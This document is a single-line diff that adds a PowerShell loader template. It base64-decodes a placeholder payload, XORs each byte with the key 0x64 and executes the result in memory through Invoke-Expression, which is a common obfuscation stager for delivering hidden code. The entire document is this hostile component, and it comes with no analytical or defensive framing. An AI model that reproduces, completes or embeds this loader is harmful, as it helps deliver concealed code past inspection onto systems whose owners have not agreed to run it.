@@ -1,0 +1,1 @@
+$key=0x64;$payload="{{ insertiondata }}";$Bytes=[Convert]::FromBase64String($payload);$dec=foreach($byte in $Bytes){$byte -bxor $key};iex ([System.Text.Encoding]::Unicode.GetString($dec))
